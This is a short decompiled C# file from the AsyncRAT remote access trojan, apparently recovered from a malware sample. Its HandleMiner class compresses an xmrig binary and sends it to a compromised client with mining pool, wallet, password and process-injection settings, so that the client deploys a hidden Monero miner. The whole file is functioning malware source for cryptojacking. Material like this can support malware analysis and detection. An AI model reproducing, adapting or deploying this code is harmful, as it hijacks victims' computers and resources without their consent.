// Decompiled with JetBrains decompiler
// Type: Server.Handle_Packet.HandleMiner
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;
using System.IO;
using System.Threading;

namespace Server.Handle_Packet
{
  public class HandleMiner
  {
    public void SendMiner(Clients client)
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "xmr";
      msgPack.ForcePathObject("Command").AsString = "save";
      msgPack.ForcePathObject("Bin").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\xmrig.bin")));
      msgPack.ForcePathObject("Hash").AsString = GetHash.GetChecksum("Plugins\\xmrig.bin");
      msgPack.ForcePathObject("Pool").AsString = XmrSettings.Pool;
      msgPack.ForcePathObject("Wallet").AsString = XmrSettings.Wallet;
      msgPack.ForcePathObject("Pass").AsString = XmrSettings.Pass;
      msgPack.ForcePathObject("InjectTo").AsString = XmrSettings.InjectTo;
      ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), (object) msgPack.Encode2Bytes());
    }
  }
}
